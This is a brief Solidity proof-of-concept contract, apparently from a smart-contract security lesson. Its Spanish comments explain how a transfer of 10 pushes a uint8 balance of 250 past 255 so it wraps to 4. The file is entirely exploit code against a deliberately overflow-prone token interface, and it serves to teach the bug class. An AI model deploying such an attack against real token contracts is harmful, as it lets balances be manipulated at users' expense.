// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface ITokenOverflow {
    function transfer(address _to, uint8 _amount) external;
}

contract OverflowAttack {
    // Variables    
    ITokenOverflow public target;

    // Constructor
    constructor(address _target) {
        target = ITokenOverflow(_target);
    }

    //Funcion de ataque
    function attack() public {
        // Intentamos transferir 10 tokens a un saldo ya situado en 250 (uint8 -> 255)
        target.transfer(msg.sender, 10);
        // Resultado 4 Tokens: 250 + 10 = 260, Overflow en 256 -> 260-256 = 4   
    }
}